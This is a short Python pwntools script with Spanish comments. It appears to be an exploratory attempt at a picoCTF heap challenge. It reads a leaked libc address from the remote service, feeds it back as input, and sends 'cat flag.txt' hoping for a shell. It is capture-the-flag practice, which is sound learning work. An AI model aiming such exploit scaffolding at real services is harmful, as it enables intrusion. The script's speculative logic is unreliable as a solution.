#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

p = remote(HOST, PORT)

# Diálogo
p.recvuntil(b'From Zero to Hero')
p.sendline(b'y')
p.recvuntil(b'Really?')
p.sendline(b'y')

# Leak - esta es la pista!
p.recvuntil(b'Take this: ')
leak = p.recvline().strip()
print(f"[*] The hint is: {leak}")

# Menu
p.recvuntil(b'>')

# El leak es una dirección de libc
# "It's dangerous to go alone. Take this" - es una referencia a Zelda
# Tal vez necesito usar esta dirección de alguna manera especial

# Opción 1: Usar el leak como el tamaño
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(leak)  # Enviar el leak como tamaño!

try:
    response = p.recv(1024, timeout=1)
    print(f"Response to leak as size: {response}")
    
    if b'flag' in response.lower() or b'pico' in response.lower():
        print(f"[!] FLAG: {response}")
    
    # Si llegamos aquí, puede que funcionó
    p.sendline(b'cat flag.txt')
    flag = p.recvall(timeout=2)
    if b'pico' in flag.lower():
        print(f"[!] FLAG FOUND: {flag}")
        
except Exception as e:
    print(f"Error: {e}")
    
    # Intentar otra cosa
    # Tal vez necesito ser un "hero" = tener un poder especial
    # que es la dirección leakeada
    
    p.sendline(b'100')
    p.recvuntil(b'description')
    p.sendline(p64(int(leak, 16)))  # Enviar el leak como descripción
    
    try:
        response = p.recvall(timeout=2)
        if b'pico' in response.lower():
            print(f"[!] FLAG: {response}")
    except:
        pass

p.close()